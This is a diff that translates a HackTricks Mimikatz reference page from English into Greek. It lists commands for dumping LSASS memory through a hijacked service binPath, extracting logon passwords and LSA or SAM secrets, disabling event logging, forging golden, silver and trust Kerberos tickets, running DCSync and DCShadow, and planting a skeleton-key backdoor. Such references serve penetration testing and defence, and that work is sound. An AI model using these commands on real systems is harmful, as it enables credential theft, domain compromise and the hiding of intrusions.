@@ -2,219 +2,206 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Check the original for further info!
+**Αυτή η σελίδα βασίζεται σε μια από το [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Ελέγξτε το πρωτότυπο για περαιτέρω πληροφορίες!
 
-## LM and Clear-Text in memory
+## LM και κείμενο σε μνήμη
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Από τα Windows 8.1 και τα Windows Server 2012 R2 και μετά, έχουν ληφθεί σημαντικά μέτρα για την προστασία από την κλοπή διαπιστευτηρίων:
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- Οι **κατακερματισμένες LM και οι κωδικοί πρόσβασης σε καθαρό κείμενο** δεν αποθηκεύονται πλέον στη μνήμη για να ενισχυθεί η ασφάλεια. Πρέπει να ρυθμιστεί μια συγκεκριμένη ρύθμιση του μητρώου, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, με μια τιμή DWORD `0` για να απενεργοποιηθεί η διάσπαση των κωδικών πρόσβασης, εξασφαλίζοντας ότι οι κωδικοί "καθαρού κειμένου" δεν αποθηκεύονται στην προσωπική υπηρεσία αυθεντικοποίησης (LSASS).
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-    1. Modifying the registry at _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-    2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- Η **προστασία LSA** εισάγεται για να προστατεύσει τη διαδικασία της Τοπικής Αρχής Ασφαλείας (LSA) από μη εξουσιοδοτημένη ανάγνωση μνήμης και εισαγωγή κώδικα. Αυτό επιτυγχάνεται με τον σήμανση του LSASS ως προστατευμένη διαδικασία. Η ενεργοποίηση της προστασίας LSA περιλαμβάνει:
+1. Τροποποίηση του μητρώου στο _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ με την ρύθμιση `RunAsPPL` σε `dword:00000001`.
+2. Εφαρμογή ενός αντικειμένου ομάδας πολιτικής (GPO) που επιβάλλει αυτήν την αλλαγή του μητρώου σε όλες τις διαχειριζόμενες συσκευές.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Παρά τις προστασίες αυτές, εργαλεία όπως το Mimikatz μπορούν να παρακάμψουν την προστασία LSA χρησιμοποιώντας συγκεκριμένους οδηγούς, αν και τέτοιες ενέργειες πιθανόν να καταγράφονται στα αρχεία καταγραφής συμβάντων.
 
-### Counteracting SeDebugPrivilege Removal
+### Αντιμετώπιση της αφαίρεσης του SeDebugPrivilege
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+Οι διαχειριστές συνήθως έχουν το SeDebugPrivilege, που τους επιτρέπει να εντοπίζουν σφάλματα σε προγράμματα. Αυτό το προνόμιο μπορεί να περιοριστεί για να αποτραπούν μη εξουσιοδοτημένες αντιγραφές μνήμης, μια συνηθισμένη τεχνική που χρησιμοποιούν οι επιτιθέμενοι για να αντλήσουν διαπιστευτήρια από τη μνήμη. Ωστόσο, ακόμα και με αυτό το προνόμιο αφαιρεμένο, ο λογαριασμός TrustedInstaller μπορεί ακόμα να εκτελέσει αντιγραφές μνήμης χρησιμοποιώντας μια προσαρμοσμένη διαμόρφωση υπηρεσίας:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+Αυτό επιτρέπει την αποθήκευση της μνήμης του `lsass.exe` σε ένα αρχείο, το οποίο μπορεί στη συνέχεια να αναλυθεί σε ένα άλλο σύστημα για την εξαγωγή διαπιστευτηρίων:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## Επιλογές του Mimikatz
 
-## Mimikatz Options
+Η παραπληροφόρηση των αρχείων καταγραφής συμβάντων στο Mimikatz περιλαμβάνει δύο κύριες ενέργειες: τη διαγραφή των αρχείων καταγραφής συμβάντων και την τροποποίηση της υπηρεσίας Συμβάντων για να αποτραπεί η καταγραφή νέων συμβάντων. Παρακάτω παρατίθενται οι εντολές για την εκτέλεση αυτών των ενεργειών:
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+#### Διαγραφή των αρχείων καταγραφής συμβάντων
 
-#### Clearing Event Logs
+- **Εντολή**: Αυτή η ενέργεια αποσκοπεί στη διαγραφή των αρχείων καταγραφής συμβάντων, καθιστώντας πιο δύσκολη την ανίχνευση κακόβουλων δραστηριοτήτων.
+- Το Mimikatz δεν παρέχει μια άμεση εντολή στην τυπική τεκμηρίωσή του για τη διαγραφή των αρχείων καταγραφής συμβάντων απευθείας μέσω της γραμμής εντολών του. Ωστόσο, η παραπληροφόρηση των αρχείων καταγραφής συνήθως περιλαμβάνει τη χρήση εργαλείων συστήματος ή σεναρίων εκτός του Mimikatz για τη διαγραφή συγκεκριμένων αρχείων καταγραφής (π.χ. χρησιμοποιώντας το PowerShell ή τον Προβολέα Συμβάντων των Windows).
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+#### Πειραματική δυνατότητα: Τροποποίηση της υπηρεσίας Συμβάντων
 
-#### Experimental Feature: Patching the Event Service
+- **Εντολή**: `event::drop`
+- Αυτή η πειραματική εντολή έχει σχεδιαστεί για να τροποποιήσει τη συμπεριφορά της υπηρεσίας καταγραφής συμβάντων, αποτρέποντας αποτελεσματικά την καταγραφή νέων συμβάντων.
+- Παράδειγμα: `mimikatz "privilege::debug" "event::drop" exit`
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- Η εντολή `privilege::debug` εξασφαλίζει ότι το Mimikatz λειτουργεί με τα απαραίτητα προνόμια για την τροποποίηση των υπηρεσιών του συστήματος.
+- Η εντολή `event::drop` τροποποιεί την υπηρεσία καταγραφής συμβάντων.
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+### Επιθέσεις σε εισιτήρια Kerberos
 
+### Δημιουργία Χρυσού Εισιτηρίου
 
-### Kerberos Ticket Attacks
+Ένα Χρυσό Εισιτήριο επιτρέπει την παραπληροφόρηση πρόσβασης σε όλο τον τομέα. Κύρια εντολή και παράμετροι:
 
-### Golden Ticket Creation
+- Εντολή: `kerberos::golden`
+- Παράμετροι:
+- `/domain`: Το όνομα του τομέα.
+- `/sid`: Ο αναγνωριστικός αριθμός ασφαλείας (SID) του τομέα.
+- `/user`: Το όνομα χρήστη που θα παραπληροφορηθεί.
+- `/krbtgt`: Το NTLM hash του λογαριασμού υπηρεσίας KDC του τομέα.
+- `/ptt`: Ενσωματώνει απευθείας το εισιτήριο στη μνήμη.
+- `/ticket`: Αποθηκεύει το εισιτήριο για μεταγενέστερη χρήση.
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
-
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
-
-Example:
-
+Παράδειγμα:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Δημιουργία Silver Ticket
 
-### Silver Ticket Creation
+Τα Silver Tickets παρέχουν πρόσβαση σε συγκεκριμένες υπηρεσίες. Κύρια εντολή και παράμετροι:
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- Εντολή: Παρόμοια με το Golden Ticket αλλά στοχεύει σε συγκεκριμένες υπηρεσίες.
+- Παράμετροι:
+- `/service`: Η υπηρεσία που στοχεύεται (π.χ., cifs, http).
+- Άλλες παράμετροι παρόμοιες με το Golden Ticket.
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+Παράδειγμα:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### Δημιουργία εισιτηρίου εμπιστοσύνης
 
-### Trust Ticket Creation
+Τα εισιτήρια εμπιστοσύνης χρησιμοποιούνται για την πρόσβαση σε πόρους από διαφορετικούς τομείς εκμεταλλευόμενοι τις σχέσεις εμπιστοσύνης. Κύρια εντολή και παράμετροι:
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- Εντολή: Παρόμοια με το Golden Ticket αλλά για τις σχέσεις εμπιστοσύνης.
+- Παράμετροι:
+- `/target`: Το πλήρες όνομα του τομέα προορισμού.
+- `/rc4`: Το NTLM hash για τον λογαριασμό εμπιστοσύνης.
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+Παράδειγμα:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### Επιπλέον Εντολές Kerberos
 
-### Additional Kerberos Commands
+- **Λίστα Εισιτηρίων**:
+- Εντολή: `kerberos::list`
+- Εμφανίζει όλα τα εισιτήρια Kerberos για την τρέχουσα συνεδρία χρήστη.
 
-- **Listing Tickets**:
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **Πέρασμα της Κρυφής Μνήμης**:
+- Εντολή: `kerberos::ptc`
+- Εισάγει εισιτήρια Kerberos από αρχεία μνήμης.
+- Παράδειγμα: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Pass the Cache**:
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **Πέρασμα του Εισιτηρίου**:
+- Εντολή: `kerberos::ptt`
+- Επιτρέπει τη χρήση ενός εισιτηρίου Kerberos σε μια άλλη συνεδρία.
+- Παράδειγμα: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Pass the Ticket**:
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
-
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+- **Εκκαθάριση Εισιτηρίων**:
+- Εντολή: `kerberos::purge`
+- Καθαρίζει όλα τα εισιτήρια Kerberos από τη συνεδρία.
+- Χρήσιμο πριν από τη χρήση εντολών παραπλάνησης εισιτηρίων για να αποφευχθούν συγκρούσεις.
 
 
-### Active Directory Tampering
+### Παρεμβολή στο Active Directory
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCShadow**: Καθιστά προσωρινά μια μηχανή να λειτουργεί ως DC για την παραπλάνηση αντικειμένων AD.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+- **DCSync**: Προσομοιώνει ένα DC για να ζητήσει δεδομένα κωδικών πρόσβασης.
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Credential Access
+### Πρόσβαση σε Διαπιστευτήρια
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::LSA**: Εξαγωγή διαπιστευτηρίων από το LSA.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
-  - *No specific command provided for NetSync in original context.*
+- **LSADUMP::NetSync**: Παραπλανά ένα DC χρησιμοποιώντας τα δεδομένα κωδικού πρόσβασης ενός λογαριασμού υπολογιστή.
+- *Δεν παρέχεται συγκεκριμένη εντολή για το NetSync στο αρχικό περιεχόμενο.*
 
-- **LSADUMP::SAM**: Access local SAM database.
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::SAM**: Πρόσβαση στην τοπική βάση δεδομένων SAM.
+- `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::Secrets**: Αποκρυπτογράφηση μυστικών που αποθηκεύονται στο μητρώο.
+- `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::SetNTLM**: Ορίζει ένα νέο NTLM hash για έναν χρήστη.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+- **LSADUMP::Trust**: Ανάκτηση πληροφοριών ελέγχου εμπιστοσύνης.
+- `mimikatz "lsadump::trust" exit`
 
-### Miscellaneous
+### Διάφορα
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+- **MISC::Skeleton**: Εισάγει μια πίσω πόρτα στο LSASS σε ένα DC.
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### Ανέλιξη Προνομίων
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Backup**: Απόκτηση δικαιωμάτων αντιγράφου ασφαλείας.
+- `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+- **PRIVILEGE::Debug**: Απόκτηση προνομίων αποσφαλμάτωσης.
+- `mimikatz "privilege::debug" exit`
 
-### Credential Dumping
+### Αποκομιδή Διαπιστευτηρίων
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::LogonPasswords**: Εμφάνιση διαπιστευτηρίων για συνδεδεμένους χρήστες.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+- **SEKURLSA::Tickets**: Εξαγωγή εισιτηρίων Kerberos από τη μνήμη.
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid and Token Manipulation
+### Παρεμβολή Sid και Token
 
-- **SID::add/modify**: Change SID and SIDHistory.
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: *No specific command for modify in original context.*
+- **SID::add/modify**: Αλλαγή SID και SIDHistory.
+- Προσθήκη: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Τροποποίηση: *Δεν παρέχεται συγκεκριμένη εντολή για τροποποίηση στο αρχικό περιεχόμενο.*
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+- **TOKEN::Elevate**: Παραπλάνηση διακριτικών.
+- `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminal Services
+### Υπηρεσίες Τερματικού
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
-  - `mimikatz "ts::multirdp" exit`
+- **TS::MultiRDP**: Επιτρέπει πολλαπλές συνεδρίες RDP.
+- `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: List TS/RDP sessions.
-  - *No specific command provided for TS::Sessions in original context.*
+- **TS::Sessions**: Καταχωρεί τις συνεδρίες TS/RDP.
+- *Δεν παρέχεται συγκεκριμένη εντολή για TS::Sessions στο αρχικό περιεχόμενο.*
 
-### Vault
+### Θησαυροφυλάκιο
 
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Εξαγωγή κωδικών πρόσβασης από το Θησαυροφυλάκιο των Windows.
+- `mimikatz "vault::cred /patch" exit`
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον επαγγελματία με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
-
-</details>
+* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα κόλπα σας στο χάκινγκ υποβάλλοντας PRs στο** [**α
